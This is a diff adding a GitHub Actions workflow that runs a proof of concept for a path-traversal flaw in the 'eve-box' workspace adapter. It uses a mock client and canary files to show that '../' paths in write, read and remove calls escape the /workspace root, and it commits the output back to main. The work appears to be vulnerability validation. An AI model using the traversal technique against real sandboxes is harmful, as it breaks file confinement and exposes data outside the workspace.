@@ -1,0 +1,103 @@
+name: Eve Box Workspace Traversal PoC
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/eve-box-workspace-traversal-poc.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: Validate workspace traversal against official adapter
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/eve-box
+          git clone --depth=1 https://github.com/ariana-dot-dev/eve-box.git /tmp/eve-box
+          cd /tmp/eve-box
+          npm ci --ignore-scripts
+          npm run build
+
+          cat > /tmp/poc-workspace.mjs <<'JS'
+          import { asciiBox } from '/tmp/eve-box/dist/src/index.js';
+          import path from 'node:path';
+
+          const operations = [];
+          const box = { id: 'bx_local_canary', state: 'ready', name: 'local-canary' };
+          const client = {
+            async create() { return box; },
+            async get() { return box; },
+            async update() { return box; },
+            async stop() { return { ok: true }; },
+            async resume() { return { ok: true }; },
+            async command(_boxId, input) {
+              operations.push({ type: 'command', command: input.command, cwd: input.cwd });
+              return { exitCode: 0, stdout: '', stderr: '' };
+            },
+            async readFile(_boxId, p) {
+              operations.push({ type: 'read', path: p });
+              return 'READ_CANARY';
+            },
+            async writeFile(_boxId, p, content) {
+              operations.push({ type: 'write', path: p, content });
+            },
+          };
+
+          const backend = asciiBox({ client, noEnv: true, networkPolicy: 'allow-all' });
+          const handle = await backend.create({
+            templateKey: null,
+            sessionKey: 'workspace-traversal-poc',
+            runtimeContext: { appRoot: process.cwd() },
+            tags: { test: 'workspace-traversal-poc' },
+          });
+          const session = await handle.useSessionFn({ networkPolicy: 'allow-all' });
+          operations.length = 0;
+
+          await session.writeTextFile({ path: '../outside-canary.txt', content: 'WRITE_CANARY' });
+          const text = await session.readTextFile({ path: '../outside-canary.txt' });
+          await session.removePath({ path: '../outside-canary.txt', force: true });
+
+          const write = operations.find(x => x.type === 'write');
+          const read = operations.find(x => x.type === 'read');
+          const remove = operations.find(x => x.type === 'command');
+          console.log('ADAPTER_WRITE_PATH=' + JSON.stringify(write?.path));
+          console.log('ADAPTER_READ_PATH=' + JSON.stringify(read?.path));
+          console.log('ADAPTER_REMOVE_COMMAND=' + JSON.stringify(remove?.command));
+          console.log('READ_RESULT=' + JSON.stringify(text));
+
+          const canonical = path.posix.normalize('/home/user/' + write.path);
+          console.log('BOX_API_CANONICAL_PATH=' + JSON.stringify(canonical));
+          console.log('EXPECTED_WORKSPACE_ROOT="/home/user/workspace"');
+          const escaped = !canonical.startsWith('/home/user/workspace/');
+          console.log('ESCAPED_WORKSPACE=' + (escaped ? 'YES' : 'NO'));
+
+          if (write.path !== 'workspace/../outside-canary.txt') throw new Error('unexpected write path');
+          if (read.path !== 'workspace/../outside-canary.txt') throw new Error('unexpected read path');
+          if (!remove.command.includes("'workspace/../outside-canary.txt'")) throw new Error('remove did not preserve traversal');
+          if (canonical !== '/home/user/outside-canary.txt') throw new Error('canonicalization mismatch');
+          if (!escaped) throw new Error('workspace confinement held unexpectedly');
+
+          console.log('VALIDATED=YES');
+          console.log('IMPACT=Eve file read/write/remove paths can escape /workspace into the Box user home via .. traversal.');
+          JS
+
+          node /tmp/poc-workspace.mjs | tee /tmp/eve-box-workspace-traversal-poc.txt
+          cp /tmp/eve-box-workspace-traversal-poc.txt "$GITHUB_WORKSPACE/eve-box-workspace-traversal-poc.txt"
+
+      - name: Persist PoC output
+        shell: bash
+        run: |
+          git config user.name 'box-recon-bot'
+          git config user.email 'box-recon-bot@users.noreply.github.com'
+          git add -f eve-box-workspace-traversal-poc.txt
+          git diff --cached --quiet && exit 0
+          git commit -m 'Record validated Eve Box workspace traversal PoC [skip ci]'
+          git push origin HEAD:main
